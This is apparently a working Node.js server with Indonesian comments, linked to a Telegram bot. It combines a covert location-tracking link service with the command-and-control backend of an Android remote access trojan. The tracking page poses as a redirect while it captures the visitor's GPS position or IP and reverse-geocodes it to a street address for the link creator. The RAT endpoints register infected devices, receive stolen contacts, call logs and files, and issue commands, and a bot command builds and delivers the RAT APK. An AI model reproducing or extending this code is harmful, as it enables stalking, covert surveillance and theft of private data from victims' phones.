const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const axios = require('axios');
const mongoose = require('mongoose');
const config = require('./config');
const bot = require('./telegram');
const TrackedLink = require('./models/trackedLink');
const multer = require('multer');
const fs = require('fs');
const { exec } = require('child_process');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

mongoose.Promise = require('bluebird');
mongoose.connect(config.mongodbUri, {
    useNewUrlParser: true,
})
.then(() => console.log('Terhubung ke MongoDB'))
.catch(err => console.error('Gagal terhubung ke MongoDB', err));

// Live Chat Web Server
app.use(express.static(path.join(__dirname, 'public')));

app.get('/live-chat/:chatId', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'live-chat.html'));
});

app.get('/live-chat/admin/:chatId', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-chat.html'));
});

// Middleware untuk parsing body JSON
app.use(express.json());

app.get('/track/:alias', async (req, res) => {
    try {
        const { alias } = req.params;
        const linkData = await TrackedLink.findOne({ alias: alias });

        if (!linkData) {
            return res.status(404).send('Tautan tidak ditemukan atau telah kedaluwarsa.');
        }

        // HTML yang akan dikirim ke browser pengguna
        const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
    </style>
</head>
<body>
    <p>Please wait, we are processing your request and redirecting you...</p>
    <script>
        const alias = '${alias}';
        const originalLink = '${linkData.originalLink}';

        function redirect() {
            window.location.href = originalLink;
        }

        function reportLocation(position) {
            const { latitude, longitude } = position.coords;
            const data = { alias, latitude, longitude };
            // Menggunakan sendBeacon untuk pengiriman data yang lebih andal saat halaman akan ditutup
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/location-data', new Blob([JSON.stringify(data)], { type: 'application/json' }));
            } else {
                fetch('/location-data', { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'}, keepalive: true });
            }
            redirect();
        }

        function handleLocationError() {
            const data = { alias };
             // Fallback ke pelacakan berbasis IP
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/ip-track', new Blob([JSON.stringify(data)], { type: 'application/json' }));
            } else {
                fetch('/ip-track', { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'}, keepalive: true });
            }
            redirect();
        }

        // Failsafe: redirect setelah beberapa detik jika tidak ada respons dari Geolocation API
        const redirectTimeout = setTimeout(handleLocationError, 2000);

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    clearTimeout(redirectTimeout); // Batalkan failsafe redirect
                    reportLocation(pos);
                },
                () => {
                    clearTimeout(redirectTimeout); // Batalkan failsafe redirect
                    handleLocationError(); // Pengguna menolak atau terjadi error
                },
                { timeout: 8000 } // Waktu tunggu maksimal 8 detik
            );
        } else {
            clearTimeout(redirectTimeout); // Batalkan failsafe redirect
            handleLocationError(); // Browser tidak mendukung geolokasi
        }
    <\/script>
</body>
</html>`;

        res.send(html);

    } catch (error) {
        console.error("Kesalahan pada endpoint /track/:alias:", error);
        res.status(500).send('Terjadi kesalahan internal.');
    }
});

// Endpoint untuk fallback pelacakan berbasis IP
app.post('/ip-track', async (req, res) => {
    try {
        const { alias } = req.body;
        const linkData = await TrackedLink.findOne({ alias: alias });

        if (!linkData) {
            return res.status(404).json({ message: 'Alias not found' });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        let notificationMessage = `🔔 *Tautan Dilacak Terbuka (Info Dasar)*\n\n` +
                                  `_Lokasi presisi tidak diterima (mungkin ditolak pengguna atau browser tidak mendukung), menampilkan info dari IP Address._\n\n` +
                                  `🔗 **Tautan Asli:** ${linkData.originalLink}\n` +
                                  `👤 **Dibuka oleh:**\n` +
                                  `   - **IP:** \`${ip}\`\n` +
                                  `   - **User Agent:** \`${userAgent}\``;

        try {
            const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp`);
            const geoData = geoResponse.data;
            if (geoData.status === 'success') {
                notificationMessage += `\n\n📍 *Lokasi Perkiraan (berdasarkan IP):*\n` +
                                       `   - **Negara:** ${geoData.country}\n` +
                                       `   - **Wilayah:** ${geoData.regionName}\n` +
                                       `   - **Kota:** ${geoData.city}\n` +
                                       `   - **ZIP:** ${geoData.zip}\n` +
                                       `   - **ISP:** ${geoData.isp}`;
            }
        } catch (geoError) {
            console.error("Gagal mendapatkan info geolokasi:", geoError.message);
        }

        await bot.sendMessage(linkData.creatorChatId, notificationMessage, { parse_mode: 'Markdown' });
        res.status(200).send('OK');

    } catch (error) {
        console.error("Kesalahan pada endpoint /ip-track:", error);
        res.status(500).send('Terjadi kesalahan internal.');
    }
});

// Endpoint untuk menerima dan memproses data lokasi presisi
app.post('/location-data', async (req, res) => {
    try {
        const { alias, latitude, longitude } = req.body;

        if (!alias || latitude === undefined || longitude === undefined) {
            return res.status(400).json({ message: 'Data tidak lengkap' });
        }

        const linkData = await TrackedLink.findOne({ alias: alias });
        if (!linkData) {
            return res.status(404).json({ message: 'Alias tidak ditemukan' });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];
        const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;

        let notificationMessage = `🎯 *Lokasi Presisi Terdeteksi!*\n\n` +
                                  `🔗 **Tautan Asli:** ${linkData.originalLink}\n` +
                                  `👤 **Info Perangkat:**\n` +
                                  `   - **IP:** \`${ip}\`\n` +
                                  `   - **User Agent:** \`${userAgent}\`\n` +
                                  `   - **Koordinat:** \`${latitude}, ${longitude}\`\n` +
                                  `   - **Lihat di Peta:** [Google Maps](${googleMapsLink})`;

        try {
            // Reverse geocoding menggunakan OpenStreetMap Nominatim
            const geoResponse = await axios.get(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`, {
                headers: {
                    'User-Agent': 'WanzofcShopBot/1.0 (Telegram Bot)'
                }
            });

            const address = geoResponse.data.address;
            const displayName = geoResponse.data.display_name;

            if (address) {
                notificationMessage += `\n\n📍 *Alamat Detail (Estimasi):*\n` +
                                   (address.road ? `   - *Jalan:* ${address.road}\n` : '') +
                                   (address.neighbourhood ? `   - *Lingkungan/RT/RW:* ${address.neighbourhood}\n` : '') +
                                   (address.suburb ? `   - *Kelurahan/Kecamatan:* ${address.suburb}\n` : '') +
                                   (address.city || address.state ? `   - *Kota/Provinsi:* ${address.city || ''}, ${address.state || ''}\n` : '') +
                                   (address.postcode ? `   - *Kode Pos:* ${address.postcode}\n` : '') +
                                   (address.country ? `   - *Negara:* ${address.country}\n` : '') +
                                   `\n   - *Alamat Lengkap:* \`${displayName}\``;
            }
        } catch (geoError) {
            console.error("Gagal melakukan reverse geocoding:", geoError.message);
            notificationMessage += `\n\n📍 *Info Alamat:* Gagal mendapatkan detail alamat dari koordinat.`;
        }

        await bot.sendMessage(linkData.creatorChatId, notificationMessage, { parse_mode: 'Markdown', disable_web_page_preview: true });
        res.status(200).send('OK');

    } catch (error) {
        console.error("Kesalahan pada endpoint /location-data:", error);
        res.status(500).send('Terjadi kesalahan internal.');
    }
});

const Rat = require('./models/rat');

// * --- RAT Endpoints --- *

// Endpoint for RAT to register itself
app.post('/rat/register', async (req, res) => {
    try {
        const { deviceId, chatId } = req.body;
        if (!deviceId || !chatId) {
            return res.status(400).json({ message: 'Missing deviceId or chatId' });
        }

        let rat = await Rat.findOne({ deviceId });
        if (rat) {
            rat.chatId = chatId;
            rat.lastSeen = Date.now();
        } else {
            rat = new Rat({ deviceId, chatId });
        }
        await rat.save();

        bot.sendMessage(chatId, `🤖 New RAT connected: ${deviceId}`);
        res.status(200).json({ message: 'RAT registered successfully' });
    } catch (error) {
        console.error("Error in /rat/register:", error);
        res.status(500).send('Internal Server Error');
    }
});

// Endpoint for Android RAT to notify connection
app.post('/rat/register/android', async (req, res) => {
    try {
        const { deviceId } = req.body;
        if (!deviceId) {
            return res.status(400).json({ message: 'Missing deviceId in request body' });
        }

        // Notify the admin
        const notificationMessage = `📱 **Perangkat Android Baru Terhubung!**\n\nID Perangkat: \`${deviceId}\`\n\nAnda sekarang dapat mengelolanya dari menu Awan Premium.`;
        await bot.sendMessage(config.adminId, notificationMessage, { parse_mode: 'Markdown' });

        res.status(200).json({ message: 'Notification sent successfully' });

    } catch (error) {
        console.error("Error in /rat/register/android:", error);
        res.status(500).send('Internal Server Error');
    }
});

// Helper function to format contacts data
function formatContacts(data) {
    let message = 'Kontak yang Diterima:\n\n';
    const uniquePhoneNumbers = new Set();
    try {
        const values = data.values || [];
        values.forEach(item => {
            const pairs = item.nameValuePairs;
            if (pairs && pairs.PhoneNumber && !uniquePhoneNumbers.has(pairs.PhoneNumber)) {
                message += `Nama: ${pairs.Name}\nNomor: ${pairs.PhoneNumber}\n\n`;
                uniquePhoneNumbers.add(pairs.PhoneNumber);
            }
        });
        return message;
    } catch (e) {
        return "Gagal memformat data kontak. Menampilkan data mentah:\n\n" + JSON.stringify(data, null, 2);
    }
}

// Helper function to format call logs data
function formatCallLogs(data) {
    let message = 'Log Panggilan yang Diterima:\n\n';
    try {
        const values = data.values || [];
        // The Java code reverses the list, so we do the same for consistency
        for (let i = values.length - 1; i >= 0; i--) {
            const pairs = values[i].nameValuePairs;
            if (pairs) {
                message += `Nomor: ${pairs.PhoneNumber}\n`;
                message += `Nama: ${pairs.CallerName || 'Tidak Tersedia'}\n`;
                message += `Tanggal: ${pairs.CallDate}\n`;
                message += `Tipe: ${pairs.CallType}\n`;
                message += `Durasi: ${pairs.CallDuration}\n\n`;
            }
        }
        return message;
    } catch (e) {
        return "Gagal memformat data log panggilan. Menampilkan data mentah:\n\n" + JSON.stringify(data, null, 2);
    }
}

// Endpoint for RAT to send data
app.post('/rat/data', async (req, res) => {
    try {
        const { deviceId, dataType, data } = req.body;
        if (!deviceId || !dataType || !data) {
            return res.status(400).json({ message: 'Missing deviceId, dataType, or data' });
        }

        const rat = await Rat.findOne({ deviceId });
        if (!rat) {
            return res.status(404).json({ message: 'RAT not found' });
        }

        let message;
        if (dataType === 'contacts') {
            message = formatContacts(data);
        } else if (dataType === 'call_logs') {
            message = formatCallLogs(data);
        } else {
            // Fallback for other data types
            message = `Menerima data tipe '${dataType}' dari RAT ${deviceId}:\n\n${JSON.stringify(data, null, 2)}`;
        }

        bot.sendMessage(rat.chatId, message);

        res.status(200).json({ message: 'Data received' });
    } catch (error) {
        console.error("Error in /rat/data:", error);
        res.status(500).send('Internal Server Error');
    }
});

// Endpoint for RAT to get commands
app.get('/rat/command', async (req, res) => {
    try {
        const { deviceId } = req.query;
        if (!deviceId) {
            return res.status(400).json({ message: 'Missing deviceId' });
        }

        const rat = await Rat.findOne({ deviceId });
        if (!rat) {
            return res.status(404).json({ message: 'RAT not found' });
        }

        if (rat.pendingCommand) {
            const command = rat.pendingCommand;
            rat.pendingCommand = null;
            await rat.save();
            return res.status(200).json({ command });
        } else {
            return res.status(200).json({ command: null });
        }
    } catch (error) {
        console.error("Error in /rat/command:", error);
        res.status(500).send('Internal Server Error');
    }
});

// Setup multer for file uploads
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const uploadPath = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadPath)) {
            fs.mkdirSync(uploadPath, { recursive: true });
        }
        cb(null, uploadPath);
    },
    filename: function (req, file, cb) {
        // Use deviceId and timestamp in filename to avoid conflicts
        const deviceId = req.body.deviceId || 'unknown_device';
        const timestamp = Date.now();
        const originalName = file.originalname || 'upload';
        cb(null, `${timestamp}-${deviceId}-${originalName}`);
    }
});
const upload = multer({ storage: storage });

// Endpoint for RAT to upload files
app.post('/rat/upload', upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;
        const file = req.file;

        if (!file) {
            return res.status(400).json({ message: 'No file uploaded.' });
        }

        console.log(`File received from ${deviceId}: ${file.filename}`);

        // Notify the admin and send the file
        const caption = `📁 File diterima dari perangkat:\n\`${deviceId}\`\n\nNama File: \`${file.originalname}\``;
        await bot.sendDocument(config.adminId, file.path, {}, { caption: caption });

        res.status(200).json({ message: 'File uploaded successfully' });

    } catch (error) {
        console.error("Error in /rat/upload:", error);
        res.status(500).send('Internal Server Error');
    }
});

io.on('connection', (socket) => {
    console.log('a user connected');

    socket.on('join', (chatId) => {
        socket.join(chatId);
        console.log(`User joined room: ${chatId}`);
        const adminLink = `${config.botBaseUrl}/live-chat/admin/${chatId}`;
        bot.sendMessage(config.adminId, `Pengguna baru memulai obrolan langsung. Balas di sini: ${adminLink}`);
    });

    socket.on('chat message', (data) => {
        const { chatId, message, from } = data;
        io.to(chatId).emit('chat message', { message, from });

        if (from === 'user') {
            bot.sendMessage(config.adminId, `Pesan baru dari live chat ${chatId}:\n\n${message}`);
        }
    });

    socket.on('call-user', (data) => {
        const { userToCall, from, signal } = data;
        io.to(userToCall).emit('hey', { signal, from });
    });

    socket.on('accept-call', (data) => {
        const { to, signal } = data;
        io.to(to).emit('call-accepted', signal);
    });

    socket.on('disconnect', () => {
        console.log('user disconnected');
    });
});

server.listen(3000, () => {
    console.log('listening on *:3000');
});

bot.onText(/\/ambilapk/, (msg) => {
    const chatId = msg.chat.id;

    // Hanya admin yang bisa menjalankan perintah ini
    if (chatId.toString() !== config.adminId.toString()) {
        bot.sendMessage(chatId, "Maaf, Anda tidak memiliki izin untuk menggunakan perintah ini.");
        return;
    }

    // Kirim pesan konfirmasi segera
    bot.sendMessage(chatId, "✅ Perintah diterima. Memulai proses build APK di latar belakang. Anda akan diberitahu jika sudah selesai.");

    // Set a 30-minute timeout for the build process (30 * 60 * 1000 = 1800000 ms)
    const buildTimeout = 30 * 60 * 1000;

    exec('npm run build:android', { timeout: buildTimeout }, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            // Tambahkan pesan spesifik jika error disebabkan oleh timeout
            if (error.signal === 'SIGTERM') {
                bot.sendMessage(chatId, '❌ Proses build dihentikan karena melebihi batas waktu 30 menit.');
                return;
            }
            // Truncate the error message to avoid hitting Telegram's message length limit
            const fullError = stderr || error.message;
            const truncatedError = fullError.substring(0, 3500); // Batasi hingga 3500 karakter
            const errorMessage = `❌ Gagal membuat APK.\n\nLog Error (mungkin terpotong):\n\`\`\`\n${truncatedError}\n\`\`\``;
            bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
            return;
        }

        console.log(`stdout: ${stdout}`);
        if (stderr) {
            console.error(`stderr: ${stderr}`);
        }

        const apkPath = path.join(__dirname, 'android_rat_source', 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');

        if (fs.existsSync(apkPath)) {
            bot.sendDocument(chatId, apkPath, { caption: '✅ Build berhasil! Ini file APK Anda.' })
                .catch(err => {
                    console.error('Gagal mengirim APK:', err);
                    bot.sendMessage(chatId, 'Gagal mengirim file APK setelah build selesai. Cek log server.');
                });
        } else {
            const notFoundMessage = `Build sepertinya berhasil, tetapi file APK tidak dapat ditemukan di path yang diharapkan:\n\`${apkPath}\`\n\nPastikan proses build menghasilkan output yang benar.`;
            bot.sendMessage(chatId, notFoundMessage, { parse_mode: 'Markdown' });
        }
    });
});
